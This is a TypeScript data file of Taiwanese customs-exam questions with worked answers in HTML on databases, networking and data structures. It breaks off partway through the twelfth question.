export type ExamQuestion = {
  id: number;
  slug: string;
  title: string;
  points: string;
  year: string;
  examName: string;
  grade: string;
  category: string;
  subject: string;
  subjectSlug: string;
  order: string;
  html: string;
};

export const questions = [
  {
    "id": 1,
    "slug": "question-1",
    "title": "SQL 視觀表 CustSummary 與可更新性",
    "points": "30 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料庫應用",
    "subjectSlug": "115-customs-third-database-application",
    "order": "一",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">一</span>\r\n            <div>\r\n              <h2>SQL 視觀表 CustSummary 與可更新性</h2>\r\n              <p>配分 30 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              假設某家銀行定義了一個借貸表格（BORROWER）管理顧客借款的資料，包含借款顧客（ID）、借款編號（LoanNO）和金額（Amount）等三個屬性。請利用 SQL 語法，首先在資料庫系統中定義一個叫做 CustSummary 的視觀表（View），表達每一個顧客的借款總數量和借款總金額。其次，利用此視觀表和 SQL 查詢句，輸出身分證字號為「A123456789」的借款總金額。最後，請說明為何此視觀表只適用於查詢資料，而不適用於建立新的資料。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>解題重點</h3>\r\n            <p>\r\n              題目要求用 BORROWER(ID, LoanNO, Amount) 建立每位顧客的借款彙總 View。彙總欄位包含借款總數量與借款總金額，因此需要\r\n              <code>GROUP BY ID</code>，並使用 <code>COUNT</code> 與 <code>SUM</code>。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <div class=\"code-title\">\r\n              <h3>SQL 寫法</h3>\r\n              <button class=\"copy-button\" data-copy=\"sql-1\" type=\"button\">複製 SQL</button>\r\n            </div>\r\n            <pre id=\"sql-1\"><code>CREATE VIEW CustSummary AS\r\nSELECT\r\n  ID,\r\n  COUNT(LoanNO) AS LoanCount,\r\n  SUM(Amount) AS TotalAmount\r\nFROM BORROWER\r\nGROUP BY ID;\r\n\r\nSELECT TotalAmount\r\nFROM CustSummary\r\nWHERE ID = 'A123456789';</code></pre>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>說明</h3>\r\n            <p>\r\n              <code>CustSummary</code> 是依顧客身分證字號分組後產生的彙總結果。每個 ID 只會出現一列，<code>LoanCount</code>\r\n              表示該顧客借款筆數，<code>TotalAmount</code> 表示該顧客所有借款金額加總。\r\n            </p>\r\n            <p>\r\n              這個 View 只適合查詢，不適合新增資料，原因是它不是直接對應 BORROWER 的單一基底資料列，而是由多列資料經過\r\n              <code>GROUP BY</code>、<code>COUNT</code>、<code>SUM</code> 聚合而成。若要在 View 中新增一列，例如\r\n              <code>A123456789, 3, 900000</code>，資料庫無法判斷應該在 BORROWER 中新增幾筆 LoanNO、每筆金額各是多少，因此通常不可更新或不可插入。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 2,
    "slug": "question-2",
    "title": "BCNF 判斷、違反原因與可能問題",
    "points": "30 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料庫應用",
    "subjectSlug": "115-customs-third-database-application",
    "order": "二",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">二</span>\r\n            <div>\r\n              <h2>BCNF 判斷、違反原因與可能問題</h2>\r\n              <p>配分 30 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              BCNF（Boyce-Codd Normal Form）是設計關聯式資料庫綱要時常遵守的形式，請說明如何判斷一個表格是否符合 BCNF 的規定？若不符合會帶來何種問題？下列定義表格 R 的綱要、函數相依性和三筆範例資料：\r\n            </p>\r\n            <pre class=\"prompt-pre\"><code>R = (A, B, C, D)\r\nF = {AB → CD, C → B}\r\n\r\nA   B   C   D\r\na1  b1  c1  d1\r\na1  b2  c1  d2\r\na2  b1  c1  d3</code></pre>\r\n            <p>\r\n              請根據上述資訊詳加解釋為何該表格不符合 BCNF？並以範例資料明確指出此表格可能產生的問題。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>BCNF 判斷原則</h3>\r\n            <p>\r\n              一個關聯表格若要符合 BCNF，對於每一個非平凡函數相依\r\n              <code>X → Y</code>，左側決定因素 <code>X</code> 都必須是該表格的超鍵。也就是說，任何能決定其他屬性的欄位組合，本身都要能唯一決定整筆資料。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>套用到題目 R(A, B, C, D)</h3>\r\n            <p>題目給定函數相依性：</p>\r\n            <ul>\r\n              <li><code>AB → CD</code>：AB 可決定 C 與 D，因此 AB 可決定 A、B、C、D，AB 是候選鍵。</li>\r\n              <li><code>C → B</code>：C 可決定 B，但 C 不能決定 A 與 D，因此 C 不是超鍵。</li>\r\n            </ul>\r\n            <p>\r\n              因為 <code>C → B</code> 的左側 <code>C</code> 不是超鍵，卻可以決定非鍵屬性 B，所以 R 不符合 BCNF。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>用範例資料指出問題</h3>\r\n            <div class=\"table-wrap\">\r\n              <table>\r\n                <thead>\r\n                  <tr>\r\n                    <th>A</th>\r\n                    <th>B</th>\r\n                    <th>C</th>\r\n                    <th>D</th>\r\n                  </tr>\r\n                </thead>\r\n                <tbody>\r\n                  <tr>\r\n                    <td>a1</td>\r\n                    <td>b1</td>\r\n                    <td>c1</td>\r\n                    <td>d1</td>\r\n                  </tr>\r\n                  <tr>\r\n                    <td>a1</td>\r\n                    <td>b2</td>\r\n                    <td>c1</td>\r\n                    <td>d2</td>\r\n                  </tr>\r\n                  <tr>\r\n                    <td>a2</td>\r\n                    <td>b1</td>\r\n                    <td>c1</td>\r\n                    <td>d3</td>\r\n                  </tr>\r\n                </tbody>\r\n              </table>\r\n            </div>\r\n            <p>\r\n              若規則 <code>C → B</code> 成立，則同一個 C 值應只能對應同一個 B 值。但範例中 <code>c1</code>\r\n              同時出現 <code>b1</code> 與 <code>b2</code>，表示資料已經可能產生不一致。這正是 BCNF 違反後常見的異常。\r\n            </p>\r\n            <p>\r\n              可能問題包括：第一，更新異常，若 <code>c1</code> 對應的 B 要改，必須更新多列，漏改就不一致；第二，插入異常，若只想新增\r\n              <code>C → B</code> 的規則，卻還沒有 A 與 D，可能無法自然存入；第三，刪除異常，刪除某筆資料時可能把某個 C 對應 B 的事實一併刪掉。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 3,
    "slug": "question-3",
    "title": "資料倉儲 ETL 與同步/非同步資料收集",
    "points": "20 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料庫應用",
    "subjectSlug": "115-customs-third-database-application",
    "order": "三",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">三</span>\r\n            <div>\r\n              <h2>資料倉儲 ETL 與同步/非同步資料收集</h2>\r\n              <p>配分 20 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              資料倉儲（Data Warehouse）架構常被用來整合多種資料來源以進行資料分析，而建立資料倉儲的其中一個重要步驟是進行 ETL（Extract, Transform, Load）。首先，請詳述該步驟的功用。其次，收集資料的時機有同步（Synchronous）和非同步（asynchronous）兩種，請詳述此兩種做法的差別和優缺點。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>ETL 的功用</h3>\r\n            <p>\r\n              ETL 是資料倉儲建置的重要流程，包含 Extract、Transform、Load。Extract 負責從交易系統、檔案、API、日誌或外部資料源擷取資料；\r\n              Transform 負責清理錯誤、統一格式、轉換編碼、去除重複、補足缺值、整合主鍵、建立衍生欄位與商業規則；Load 則將處理後資料載入資料倉儲、資料超市或分析模型。\r\n            </p>\r\n            <p>\r\n              ETL 的核心價值是把分散且格式不一的資料整理成可供查詢、報表、OLAP 與決策分析使用的一致資料。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>同步與非同步資料收集</h3>\r\n            <div class=\"compare\">\r\n              <div>\r\n                <h4>同步 Synchronous</h4>\r\n                <p>\r\n                  資料來源產生變動時，立即同步到資料倉儲或中介系統。優點是資料新鮮度高、一致性較強，適合即時監控或風險控管。缺點是系統耦合度高，來源系統可能因同步程序而增加延遲，若目標系統異常也可能影響原交易流程。\r\n                </p>\r\n              </div>\r\n              <div>\r\n                <h4>非同步 Asynchronous</h4>\r\n                <p>\r\n                  透過排程批次、佇列、事件串流或日誌擷取，在稍後時間處理資料。優點是對來源系統影響較小、可批量處理、容錯與重試較容易。缺點是資料有時間落差，分析結果可能是最終一致而非即時一致，也需要處理延遲、重複與補償問題。\r\n                </p>\r\n              </div>\r\n            </div>\r\n          </section>"
  },
  {
    "id": 4,
    "slug": "question-4",
    "title": "資料字典 Data Dictionary",
    "points": "20 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料庫應用",
    "subjectSlug": "115-customs-third-database-application",
    "order": "四",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">四</span>\r\n            <div>\r\n              <h2>資料字典 Data Dictionary</h2>\r\n              <p>配分 20 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              資料庫管理系統中有一種特別的資料結構稱作資料字典（Data Dictionary）。請說明資料字典中存放何種資料，並提出至少三類，以及關聯式資料庫系統通常如何實作資料字典。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>資料字典存放的資料</h3>\r\n            <p>\r\n              資料字典存放的是「描述資料的資料」，也就是資料庫的 metadata，而不是一般業務資料。它讓 DBMS 知道資料表、欄位、限制、索引、權限與物件相依性如何被定義。\r\n            </p>\r\n            <ul>\r\n              <li>綱要與結構資訊：資料表、欄位名稱、資料型態、長度、預設值、View 定義。</li>\r\n              <li>限制與關聯資訊：主鍵、外鍵、唯一限制、檢查限制、資料表之間的相依關係。</li>\r\n              <li>安全與權限資訊：使用者、角色、授權、物件存取權限。</li>\r\n              <li>效能與儲存資訊：索引、統計資料、表空間、資料檔案、分割區資訊。</li>\r\n              <li>程式物件資訊：Stored Procedure、Function、Trigger、Package 或排程工作。</li>\r\n            </ul>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>關聯式資料庫如何實作</h3>\r\n            <p>\r\n              關聯式資料庫通常以系統目錄表或系統 View 實作資料字典。這些資料本身也存放在資料庫中，由 DBMS 自動維護，例如建立資料表時，系統會把表格名稱、欄位型態、限制與索引寫入系統目錄。\r\n            </p>\r\n            <p>\r\n              使用者通常不直接修改資料字典，而是透過 SQL DDL，例如 <code>CREATE TABLE</code>、<code>ALTER TABLE</code>、<code>CREATE INDEX</code>\r\n              讓 DBMS 更新。查詢時則可透過標準的 <code>INFORMATION_SCHEMA</code> 或各資料庫提供的系統 catalog view 查看。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 5,
    "slug": "question-5",
    "title": "DHCP 自動設定與 169.254 位址",
    "points": "25 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資通網路",
    "subjectSlug": "115-customs-third-network",
    "order": "一",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">一</span>\r\n            <div>\r\n              <h2>DHCP 自動設定與 169.254 位址</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              小華買了一台新的筆記型電腦，插上房間的網路線準備參加線上課程。這台電腦必須透過家中的路由器取得正確的網路參數才能連上網際網路。請說明新電腦通常透過路由器內建的何種服務自動取得 IP 位址，以及若 IP 位址為 169.254.1.5 且無法開啟網頁，代表發生什麼問題。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>自動取得 IP 的服務</h3>\r\n            <p>\r\n              新電腦接上有線網路時，通常會透過路由器內建的 <strong>DHCP</strong>（Dynamic Host Configuration Protocol，動態主機設定協定）自動取得網路參數。\r\n            </p>\r\n            <p>\r\n              DHCP 的目的，是自動分配 IP 位址，並提供子網路遮罩、預設閘道與 DNS 伺服器等設定，讓電腦能加入區域網路並連上網際網路，也可避免使用者手動設定錯誤。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>169.254.1.5 的意義</h3>\r\n            <p>\r\n              若電腦取得 <code>169.254.1.5</code>，代表它沒有成功從路由器的 DHCP 伺服器取得 IP 位址。<code>169.254.x.x</code> 屬於 APIPA（Automatic Private IP Addressing，自動私有 IP 位址），是 DHCP 請求失敗後由作業系統自動產生的位址。\r\n            </p>\r\n            <p>\r\n              可能原因包括路由器 DHCP 功能未啟用、網路線或網路孔故障、路由器異常，或電腦與路由器之間無法正常通訊。因為沒有取得正確的預設閘道與 DNS，電腦通常無法開啟網頁。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 6,
    "slug": "question-6",
    "title": "蜂巢式行動通訊系統元件與位置更新",
    "points": "25 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資通網路",
    "subjectSlug": "115-customs-third-network",
    "order": "二",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">二</span>\r\n            <div>\r\n              <h2>蜂巢式行動通訊系統元件與位置更新</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              在蜂巢式系統中，行動通訊系統包含 MSC、AUC、EIR、HLR 與 VLR 五個元件。請分別說明其作用，並說明手機移動至註冊區域外時，MS 與當地 BS 之間如何維持通訊功能。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>五個元件的作用</h3>\r\n            <ul>\r\n              <li><strong>MSC，Mobile Switching Center：</strong>負責通話交換、路由選擇、連線控制，並與其他電話網路或行動網路互通。</li>\r\n              <li><strong>AUC，Authentication Center：</strong>負責使用者身分驗證，確認 SIM 卡與用戶是否合法，防止冒用或非法接取。</li>\r\n              <li><strong>EIR，Equipment Identity Register：</strong>儲存手機設備 IMEI 資訊，用來判斷設備是否合法，例如封鎖失竊或非法手機。</li>\r\n              <li><strong>HLR，Home Location Register：</strong>儲存用戶永久資料，例如電話號碼、服務項目、SIM 身分資料與目前所在的大致位置。</li>\r\n              <li><strong>VLR，Visitor Location Register：</strong>暫存進入該區域的外來用戶資料，讓使用者在非本籍區域也能撥打、接聽與使用服務。</li>\r\n            </ul>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>移動到其他城市時的步驟</h3>\r\n            <p>\r\n              當手機偵測到目前基地台屬於新的註冊區域，會透過當地基地台向網路發出位置更新或註冊請求。當地 MSC/VLR 接收後，向原本所屬的 HLR 查詢用戶資料，HLR 再將必要資料傳送給新的 VLR。\r\n            </p>\r\n            <p>\r\n              接著 AUC 進行 SIM 與用戶身分驗證，EIR 可檢查手機 IMEI 是否為合法設備。驗證成功後，新 VLR 暫存小明的用戶與位置資料，HLR 更新小明目前所在的 VLR 位址，舊 VLR 的暫存資料可被刪除。完成後，小明即可在新城市正常使用通訊服務。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 7,
    "slug": "question-7",
    "title": "數位簽章驗證流程與安全特性",
    "points": "25 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資通網路",
    "subjectSlug": "115-customs-third-network",
    "order": "三",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">三</span>\r\n            <div>\r\n              <h2>數位簽章驗證流程與安全特性</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              數位簽章運用非對稱加密技術確認電子文件身分與內容。小明先將原始文件做 Hash 得到訊息摘要，再用自己的私鑰加密摘要生成數位簽章，並將原始文件與數位簽章一併寄出。請說明小美收到後的驗證程序，以及此程序可保證哪些資訊安全特性。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>小美的驗證程序</h3>\r\n            <p>\r\n              小美收到原始文件與數位簽章後，先對收到的原始文件進行相同 Hash 運算，產生新的訊息摘要。接著取得小明的公開金鑰，並用該公開金鑰解開數位簽章，得到小明簽署時加密的訊息摘要。\r\n            </p>\r\n            <p>\r\n              最後，小美比較兩個摘要：一個是自己重新計算得到的摘要，另一個是從數位簽章解出的摘要。若兩者相同，表示文件未被竄改，且簽章確實可由小明公開金鑰驗證；若不同，則代表文件可能遭竄改或簽章來源不正確。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>保證的安全特性</h3>\r\n            <ul>\r\n              <li><strong>完整性，Integrity：</strong>文件只要被修改，Hash 值就會不同。摘要一致表示傳輸後內容未被竄改。</li>\r\n              <li><strong>身分鑑別，Authentication：</strong>簽章由小明私鑰產生，若能以小明公開金鑰驗證，表示簽章可對應到小明的身分。</li>\r\n              <li><strong>不可否認性，Non-repudiation：</strong>因為只有小明應持有私鑰，簽章可作為小明曾簽署該文件的證明，使其較難事後否認。</li>\r\n            </ul>\r\n            <p>\r\n              需要注意的是，數位簽章本身主要不保證機密性，因為原始文件通常仍以明文一併傳送；若要保密，還需另行加密文件內容。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 8,
    "slug": "question-8",
    "title": "TCP 三向交握與逾時重傳",
    "points": "25 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資通網路",
    "subjectSlug": "115-customs-third-network",
    "order": "四",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">四</span>\r\n            <div>\r\n              <h2>TCP 三向交握與逾時重傳</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              小明使用有線網路觀看高畫質串流影片，播放軟體採用 TCP 確保資料傳輸可靠。請描述影片資料開始傳送前的三向交握流程與目的；若傳送途中部分資料遺失且傳送端未在一定時間內收到 ACK，請說明傳送端會採取什麼動作。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>三向交握流程與目的</h3>\r\n            <p>\r\n              TCP 建立連線時，第一步由小明的電腦送出 <code>SYN</code> 給串流伺服器，表示想建立連線並告知自己的初始序號。第二步伺服器回傳 <code>SYN + ACK</code>，表示同意建立連線、確認收到用戶端的 SYN，並提供伺服器自己的初始序號。第三步用戶端再回傳 <code>ACK</code>，確認收到伺服器的 SYN。\r\n            </p>\r\n            <p>\r\n              三向交握的目的，是確認雙方都存在且能互相通訊，同步雙方序號，建立可靠的 TCP 連線，並為後續資料傳輸、確認應答與重傳機制做準備。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>資料遺失時的處理</h3>\r\n            <p>\r\n              當影片傳送途中因干擾造成部分資料遺失，傳送端在一定時間內沒有收到接收端的 ACK，會進行 <strong>逾時重傳</strong>（Timeout Retransmission），重新傳送尚未被確認收到的資料封包。\r\n            </p>\r\n            <p>\r\n              這樣做的目的，是補回遺失資料，確保接收端能收到完整內容，維持 TCP 的可靠傳輸特性，避免資料因封包遺失而出現缺漏或錯誤。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 9,
    "slug": "question-9",
    "title": "時間複雜度漸近符號",
    "points": "20 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料結構",
    "subjectSlug": "115-customs-third-data-structures",
    "order": "一",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">一</span>\r\n            <div>\r\n              <h2>時間複雜度漸近符號</h2>\r\n              <p>配分 20 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              請以時間複雜度之漸近符號觀念回答。前兩小題請以 Θ 與 n 表示時間複雜度；另比較甲演算法 <code>O(n log n)</code> 與乙演算法 <code>O(n^2)</code> 在實際執行時間上何時不一定由甲較快。\r\n            </p>\r\n            <pre class=\"prompt-pre\"><code>sum=0;\r\nfor (i=0; i&lt;n; i=i+2)\r\n  for (j=0; j&lt;i; j++)\r\n    sum=sum+1;</code></pre>\r\n            <pre class=\"prompt-pre\"><code>sum=0; i=0;\r\nwhile (i&lt;n) {\r\n  for (j=i; j&lt;=n; j++)\r\n    sum=sum+1;\r\n  i=i+1;\r\n};</code></pre>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>程式片段一</h3>\r\n            <p>\r\n              外層迴圈的 <code>i</code> 依序為 0、2、4，一直到小於 n。內層執行次數為 i 次，因此總次數約為 <code>0 + 2 + 4 + ... + (n 附近的偶數)</code>，這是等差級數，總和與 <code>n^2</code> 同階。\r\n            </p>\r\n            <p>\r\n              所以時間複雜度為 <strong>Θ(n^2)</strong>。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>程式片段二</h3>\r\n            <p>\r\n              <code>i</code> 從 0 增加到 n - 1。當 <code>i = 0</code> 時，內層約執行 n + 1 次；當 <code>i = 1</code> 時，約執行 n 次；依此類推，總次數約為 <code>(n + 1) + n + ... + 2</code>。\r\n            </p>\r\n            <p>\r\n              此總和仍為二次級數，因此時間複雜度為 <strong>Θ(n^2)</strong>。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>O(n log n) 不一定實際較快的情況</h3>\r\n            <p>\r\n              可列舉「資料量很小」的測試資料，例如只測試數十筆或數百筆資料。漸近複雜度描述的是 n 很大時的成長趨勢，並不表示每一個 n 都一定比較快。\r\n            </p>\r\n            <p>\r\n              若甲演算法雖為 <code>O(n log n)</code>，但常數成本很大，例如需要遞迴、額外記憶體配置、複雜資料結構或較差的快取區域性；而乙演算法雖為 <code>O(n^2)</code>，但實作簡單、常數小、資料都在連續陣列中，則在小型測試資料上乙的實際執行時間可能反而較短。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 10,
    "slug": "question-10",
    "title": "Complete Binary Tree 節點數界線證明",
    "points": "20 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料結構",
    "subjectSlug": "115-customs-third-data-structures",
    "order": "二",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">二</span>\r\n            <div>\r\n              <h2>Complete Binary Tree 節點數界線證明</h2>\r\n              <p>配分 20 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              何謂 Complete Binary Tree？假設單一節點的樹其樹高為 1，證明若 Complete Binary Tree 含 n 個節點且樹高為 h，則 <code>2^(h-1) ≤ n ≤ 2^h - 1</code>。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>定義</h3>\r\n            <p>\r\n              Complete Binary Tree（完全二元樹）是指除了最後一層外，每一層都必須填滿；最後一層的節點則由左至右依序填入，不可中間跳空。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>下界證明</h3>\r\n            <p>\r\n              若樹高為 h，代表第 h 層至少有一個節點。因為完全二元樹在最後一層以前都必須填滿，所以第 1 層到第 h - 1 層共有\r\n              <code>1 + 2 + 4 + ... + 2^(h-2) = 2^(h-1) - 1</code> 個節點。\r\n            </p>\r\n            <p>\r\n              再加上第 h 層至少 1 個節點，可得 <code>n ≥ 2^(h-1)</code>。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>上界證明</h3>\r\n            <p>\r\n              高度為 h 的二元樹若每一層都填滿，節點數最多。此時總節點數為\r\n              <code>1 + 2 + 4 + ... + 2^(h-1) = 2^h - 1</code>。\r\n            </p>\r\n            <p>\r\n              因此對任一高度為 h 的 Complete Binary Tree，都有 <strong><code>2^(h-1) ≤ n ≤ 2^h - 1</code></strong>。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 11,
    "slug": "question-11",
    "title": "Graph 的 adjacency matrix 與 adjacency multilist",
    "points": "30 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料結構",
    "subjectSlug": "115-customs-third-data-structures",
    "order": "三",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">三</span>\r\n            <div>\r\n              <h2>Graph 的 adjacency matrix 與 adjacency multilist</h2>\r\n              <p>配分 30 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              以下圖 Graph 為例，分別繪出示意圖，說明程式如何以 adjacency matrix 和 adjacency multilist 儲存此 Graph。若 Graph 有 n 個節點與 e 個邊，請分別以 Big O 寫出兩種儲存法計算所有節點 Degree 的時間複雜度，以及儲存 Graph 的空間複雜度並比較優劣。\r\n            </p>\r\n            <div class=\"graph-demo\" aria-label=\"Graph 節點與邊示意\">\r\n              <span class=\"graph-node n1\">1</span>\r\n              <span class=\"graph-node n2\">2</span>\r\n              <span class=\"graph-node n3\">3</span>\r\n              <span class=\"graph-node n4\">4</span>\r\n              <span class=\"graph-node n5\">5</span>\r\n              <span class=\"graph-node n6\">6</span>\r\n              <span class=\"graph-node n7\">7</span>\r\n              <span class=\"graph-node n8\">8</span>\r\n              <span class=\"edge e12\"></span>\r\n              <span class=\"edge e23\"></span>\r\n              <span class=\"edge e34\"></span>\r\n              <span class=\"edge e45\"></span>\r\n              <span class=\"edge e67\"></span>\r\n              <span class=\"edge e78\"></span>\r\n            </div>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>Adjacency Matrix</h3>\r\n            <p>\r\n              令節點順序為 1 到 8。若兩節點之間有邊，矩陣對應位置填 1，否則填 0。此圖的邊為\r\n              <code>(1,2)</code>、<code>(2,3)</code>、<code>(3,4)</code>、<code>(4,5)</code>、<code>(6,7)</code>、<code>(7,8)</code>。\r\n            </p>\r\n            <div class=\"table-wrap\">\r\n              <table>\r\n                <thead>\r\n                  <tr>\r\n                    <th></th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th>\r\n                  </tr>\r\n                </thead>\r\n                <tbody>\r\n                  <tr><th>1</th><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>\r\n                  <tr><th>2</th><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>\r\n                  <tr><th>3</th><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>\r\n                  <tr><th>4</th><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td></tr>\r\n                  <tr><th>5</th><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>\r\n                  <tr><th>6</th><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td></tr>\r\n                  <tr><th>7</th><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td></tr>\r\n                  <tr><th>8</th><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td></tr>\r\n                </tbody>\r\n              </table>\r\n            </div>\r\n            <p>\r\n              以 adjacency matrix 計算所有節點 degree 時，可逐列掃描矩陣並計算每列 1 的個數，所以時間複雜度為 <strong>O(n^2)</strong>；空間複雜度也為 <strong>O(n^2)</strong>。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>Adjacency Multilist</h3>\r\n            <p>\r\n              Adjacency multilist 適合無向圖。每個頂點有一個指標指向與自己相接的第一條邊；每個邊節點記錄兩端點，例如 <code>ivex</code>、<code>jvex</code>，並用兩個 link 分別串到兩端點的下一條邊。\r\n            </p>\r\n            <pre><code>Vertex 1 → E12\r\nVertex 2 → E12 → E23\r\nVertex 3 → E23 → E34\r\nVertex 4 → E34 → E45\r\nVertex 5 → E45\r\nVertex 6 → E67\r\nVertex 7 → E67 → E78\r\nVertex 8 → E78\r\n\r\nEdges: E12, E23, E34, E45, E67, E78</code></pre>\r\n            <p>\r\n              若用 multilist 計算所有節點 degree，可沿著每個頂點的邊串列計數，整體時間為 <strong>O(n + e)</strong>；儲存頂點表與邊節點所需空間也是 <strong>O(n + e)</strong>。\r\n            </p>\r\n            <p>\r\n              比較上，adjacency matrix 查詢兩點是否相鄰很快，且適合稠密圖，但空間固定為 <code>n^2</code>。Adjacency multilist 較適合稀疏圖，空間隨實際邊數成長，但查詢任兩點是否相鄰通常需要沿邊串列搜尋。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 12,
    "slug": "question-12",
    "title": "Binary Search Tree 與 Red Black Tree",
    "points": "30 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料結構",
    "subjectSlug": "115-customs-third-data-structures",
    "order": "四",
